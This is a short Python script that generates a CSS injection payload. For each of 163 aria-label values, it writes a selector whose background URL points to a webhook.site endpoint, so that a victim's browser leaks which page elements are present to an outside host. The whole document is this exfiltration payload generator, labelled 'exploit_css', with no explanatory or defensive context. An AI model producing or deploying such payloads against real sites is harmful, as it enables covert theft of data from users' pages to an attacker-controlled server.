exploit_css = ""

for i in range(1, 164):
    exploit_css += '''
    span[role="img"][aria-label="''' + str(i) + '''"]:empty {
        background: url('https://webhook.site/e03541ad-7f69-46eb-a1b2-a7df765f335a/?item=''' + str(i) + '''');
    }
    '''
    
print (exploit_css)
